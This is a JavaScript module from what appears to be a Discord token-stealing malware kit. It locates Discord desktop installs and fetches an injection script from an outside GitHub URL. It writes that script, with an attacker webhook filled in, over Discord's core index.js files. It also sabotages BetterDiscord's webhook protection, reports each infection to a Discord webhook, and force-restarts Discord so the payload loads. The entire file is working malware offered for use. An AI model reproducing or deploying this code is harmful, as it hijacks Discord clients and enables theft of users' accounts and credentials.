let fs = require("fs"),
    path = require("path"),
    { WebhookClient } = require("discord.js"),
    { getEmbeds, send } = require("./../../utils/webhook/webhook"),
    { exec } = require("child_process"),
    config = require("./../../config/config")(),
    process = require("process"),
    axios = require("axios");

let local = process.env.localappdata;

let webhook = new WebhookClient({ url: config.webhook });

let injecPath = [];

const discordsDirs = () => {
    try {
        return fs.readdirSync(local).filter((f) => f.includes("iscord")).map((f) => path.join(local, f));
    } catch (e) {
        console.error(e);
        return [];
    }
}

const findIndexs = (f) => {
    try {
        fs.readdirSync(f).forEach((d) => {
            let p = path.join(f, d);
            if (fs.statSync(p).isDirectory()) findIndexs(p);
            else if (d === "index.js" && !f.includes("node_modules") && f.includes("desktop_core")) injecPath.push(p);
        });
    } catch (e) {
        console.error(e);
    }
}

const id = (h) => {
    try {
        let c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let r = '';
        for (let i = 0; i < h; i++) { r += c.charAt(Math.floor(Math.random() * c.length)) };
        return r;
    } catch (e) {
        console.error(e);
        return "ABC"
    }
}

const injection = async () => {
    try {
        const alert = (webhook) => {
            try {
                var m = "", r = [];
                injecPath.forEach((k) => {
                    let p = k.match(/\\(Discord|DiscordCanary|DiscordDevelopment|DiscordPTB|Lightcord)\\/i), n = p ? p[1] : "Not Found"; m += `\`${n}\`, `; r.push({ k, n });
                });

                webhook.send(send(getEmbeds({
                    author: { name: "@AuraThemes - Injection", icon_url: "https://i.imgur.com/WkKXZSl.gif" },
                    title: "Discord(s) injected(s)",
                    desc: (m === "") ? "Not Found" : m.slice(0, -2)
                }
                )))
                return true;
            } catch (e) {
                console.error(e);
            }
        }

        alert(webhook);

        let res = await axios.get("https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js", { headers: { aurathemes: true } }), c = res.data.replace("%WEB" + "HOOK%", config.webhook).replace("%ID_REQUEST%", id(10));
        injecPath.forEach((f) => { fs.promises.writeFile(f, c, { encoding: "utf8", flag: "w" }) });
    } catch (e) {
        console.error(e);
    }
}

const bufferReplace = (buf, a, b) => {
    if (!Buffer.isBuffer(buf)) buf = Buffer(buf);
    let idx = buf.indexOf(a);
    if (idx === -1) return buf;
    if (!Buffer.isBuffer(b)) b = Buffer(b);
    let before = buf.slice(0, idx),
        after = replace(buf.slice(idx + a.length), a, b);
    return Buffer.concat([before, b, after], idx + b.length + after.length);
}

const betterBroke = async () => {
    try {
        let d = path.join(local, "BetterDiscord/data/betterdiscord.asar");
        if (fs.existsSync(d)) await fs.promises.writeFile(d, bufferReplace(await fs.promises.readFile(d), "api/webhooks", "aurathemes"));
    } catch (e) {
        console.error(e);
    }
}

const killApps = async (a) => {
    if (a === false) return
    try {
        await exec('tasklist', async (e, s, r) => {
            for (let c of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
                if (s.includes(c)) {
                    await exec(`taskkill /F /T /IM ${c}`, (err) => { })
                    await exec(`"${local}\\${c.replace('.exe', '')}\\Update.exe" --processStart ${c}`, (err) => { })
                }
            }
        })
    } catch (e) {
        console.error(e);
    }
};

const findInjects = async (f) => {
    try {
        let d = await fs.promises.readdir(f);
        for (let x of d) {
            let p = path.join(f, x), ñ = await fs.promises.stat(p);
            if (ñ.isDirectory()) {
                if (x === "aura") { await fs.rmdirSync(p) } else { await findInjects(p) }
            }
        }
    } catch (e) {
        console.error(e);
    }
}

const discordInjected = async (a) => {
    try {
        if (a === false) return
        let d = discordsDirs();
        for (const p of d) { findIndexs(p) }
        for (const p of d) { await findInjects(p) }
        await injection();
        await betterBroke();
        await killApps(config.kill.discords);
    } catch (e) {
        console.error(e);
    }
}

module.exports = {
    discordInjected,
};
